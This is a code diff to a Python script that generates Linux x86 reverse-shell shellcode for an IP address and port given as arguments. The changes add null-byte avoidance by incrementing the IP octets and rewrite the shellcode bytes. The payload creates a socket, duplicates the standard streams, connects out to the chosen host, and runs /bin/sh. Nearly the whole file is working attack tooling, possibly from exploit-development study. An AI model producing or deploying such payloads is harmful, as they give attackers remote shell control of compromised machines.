@@ -18,24 +18,37 @@ if len(ip.split(".")) < 4:
 port = int(sys.argv[2])
 if (port < 1024 or port > 65535):
 	print ("[!] {} not a valid port, must be between 0-65535!").format(port) #tell people off for being silly
-	exit()
+	sys.exit()
 ip = (sys.argv[1])
 port = hex(port)[2:] # convert port val to hex, and slice out the preceeding "0x" before the hex output
 port = '\\x'+str(port[0:2]) + '\\x'+str(port[2:4]) # further break up hex output and place our "\\x" in front of each hex val	
-ip = socket.inet_aton(ip).hex() #use socket module to convert IP to hex
-ip = '\\x'+str(ip[0:2]) + '\\x'+str(ip[2:4]) + '\\x'+str(ip[4:6]) + '\\x'+str(ip[6:8]) #break it into same format as port
+ip = ip.split('.') #split ip up so we can increment the octets
+oct1 = int(ip[0]) + 1 #increase octets as we did manually in nasm
+oct2 = int(ip[1]) + 1
+oct3 = int(ip[2]) + 1
+oct4 = int(ip[3]) + 1
+ip = str(oct1) + '.' + str(oct2) + '.' + str(oct3) + '.' + str(oct4) # join em all together
+print("Incremented raw IP was " + ip)
+ip = socket.inet_aton(ip).hex()
+ip = '\\x'+str(ip[0:2]) + '\\x'+str(ip[2:4]) + '\\x'+str(ip[4:6]) + '\\x'+str(ip[6:8])
+if ("00") in ip:
+	print ("ip contains nulls, try again!")
+	sys.exit()
+if ("00") in port:
+	print ("port contains nulls, try again!")
+	sys.exit()
 print("IP is: "+ ip)
 print("Port is: "+ port)
 shellcode = ""
 shellcode += "\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x31\\xc9\\x89\\xe1\\xb0"
-shellcode += "\\x66\\xb3\\x01\\xcd\\x80\\x89\\xc6\\x89\\xc3\\x31\\xc9\\xb0"
-shellcode += "\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x04\\x75\\xf6\\x31\\xc9\\xb9"
+shellcode += "\\x66\\x31\\xdb\\xb3\\x01\\xcd\\x80\\x89\\xc6\\x89\\xc3\\x31"
+shellcode += "\\xc9\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x04\\x75"
 shellcode += ip
-shellcode += "\\x81\\xe9\\x01\\x01\\x01\\x01\\x51\\x66\\x68"
+shellcode += "\\x80\\x01\\x01\\x02\\x81\\xe9\\x01\\x01\\x01\\x01\\x51\\x66\\x68"
 shellcode += port
-shellcode += "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xb3"
-shellcode += "\\x03\\x31\\xc0\\xb0\\x66\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e"
-shellcode += "\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89"
-shellcode += "\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
+shellcode += "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x31"
+shellcode += "\\xdb\\xb3\\x03\\x31\\xc0\\xb0\\x66\\xcd\\x80\\x31\\xc0\\x50"
+shellcode += "\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3"
+shellcode += "\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
 print(shellcode)
 
